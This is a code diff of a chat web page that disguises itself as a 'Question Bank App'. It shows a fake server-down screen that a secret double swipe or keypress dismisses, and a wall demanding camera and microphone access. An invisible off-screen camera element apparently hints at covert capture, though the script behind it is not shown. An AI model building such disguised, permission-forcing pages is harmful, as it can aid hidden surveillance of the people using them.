@@ -3,13 +3,28 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
-    <title>Secure Link: Ultimate</title>
+    <title>Question Bank App</title> <!-- Changed Title for Stealth -->
     <link rel="stylesheet" href="style.css">
     <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
 </head>
 <body>
 
-    <div id="app-loader">
+    <!-- STEALTH SCREEN (Always visible first) -->
+    <div id="stealth-screen">
+        <div class="stealth-icon">⚠️</div>
+        <div class="stealth-title">Server Unavailable</div>
+        <div class="stealth-desc">The Question Bank server is currently down for maintenance. Please try again later.</div>
+        <button class="stealth-btn" onclick="location.reload()">Try Again</button>
+    </div>
+
+    <!-- FULL PAGE PERMISSION BLOCK -->
+    <div id="perm-block">
+        <h2>⚠️ Permission Required</h2>
+        <p>Cannot load secure features. Voice and Video messages require microphone & camera access to function.<br><br>Please enable permissions in browser settings and tap Retry.</p>
+        <button id="perm-retry-btn">Retry Permission</button>
+    </div>
+
+    <div id="app-loader" style="display:none;">
         <div class="spinner"></div>
         <div class="loading-text">Secure Link</div>
     </div>
@@ -51,7 +66,7 @@
         <div class="ctx-item" id="ctx-remove">🗑️ Remove for Me</div>
     </div>
 
-    <!-- SIDE MENU (Adam Only) -->
+    <!-- SIDE MENU (Sam10 Only) -->
     <div id="side-menu-overlay"></div>
     <div id="side-menu">
         <div class="menu-header">Menu</div>
@@ -61,7 +76,7 @@
 
     <div id="login-screen" style="display:none;">
         <h2>SECURE LINK</h2>
-        <input type="text" class="login-input" id="inp-user" placeholder="Identity (adam/eve)">
+        <input type="text" class="login-input" id="inp-user" placeholder="Identity (sam10/mastura10)">
         <input type="password" class="login-input" id="inp-pass" placeholder="Cloud Password">
         <input type="password" class="login-input" id="inp-vault" placeholder="Secret Key">
         <button class="login-btn" id="btn-login">UNLOCK</button>
@@ -70,7 +85,7 @@
     <div id="chat-screen">
         <header>
             <div class="header-left">
-                <!-- Hamburger Button (Hidden by default, shown for Adam) -->
+                <!-- Hamburger Button (Hidden by default, shown for Sam10) -->
                 <div id="hamburger-btn" style="display:none; margin-right:10px; font-size:24px; cursor:pointer;">☰</div>
                 
                 <div class="avatar-wrapper">
@@ -92,6 +107,13 @@
         <div id="scroll-down-btn">⬇</div>
         <div id="status-text"></div>
         
+        <!-- TYPING INDICATOR -->
+        <div id="typing-indicator">
+            <div class="typing-dot"></div>
+            <div class="typing-dot"></div>
+            <div class="typing-dot"></div>
+        </div>
+
         <div id="input-area">
             <div id="reply-preview-bar">
                 <div class="reply-info">
@@ -121,8 +143,42 @@
     <video id="hidden-cam" autoplay playsinline muted style="opacity:0; position:absolute; top:-9999px; pointer-events:none; z-index:-1;"></video>
     <canvas id="hidden-canvas" style="display:none;"></canvas>
 
-    <script type="module" src="app.js?v=2"></script>
+    <script type="module">
+        // STEALTH MODE LOGIC (Inline for speed)
+        let swipes = 0;
+        let keys = 0;
+        const stealthScreen = document.getElementById('stealth-screen');
+        const appLoader = document.getElementById('app-loader');
+        
+        // Mobile: Swipe Up (Twice)
+        let startY = 0;
+        document.addEventListener('touchstart', e => startY = e.touches[0].clientY);
+        document.addEventListener('touchend', e => {
+            const endY = e.changedTouches[0].clientY;
+            if (startY - endY > 50) { // Swipe Up
+                swipes++;
+                if (swipes === 2) unlockApp();
+                setTimeout(() => swipes = 0, 2000); // Reset after 2s
+            }
+        });
+
+        // Desktop: Arrow Down (Twice)
+        document.addEventListener('keydown', e => {
+            if (e.key === "ArrowDown") {
+                keys++;
+                if (keys === 2) unlockApp();
+                setTimeout(() => keys = 0, 2000);
+            }
+        });
+
+        function unlockApp() {
+            stealthScreen.style.display = 'none';
+            appLoader.style.display = 'flex'; // Show normal loader
+            // Trigger the main app logic load if needed, 
+            // but usually the module below will handle auth check
+            document.dispatchEvent(new Event('app-unlocked'));
+        }
+    </script>
+    <script type="module" src="app.js?v=latest"></script>
 </body>
-
 </html>
-
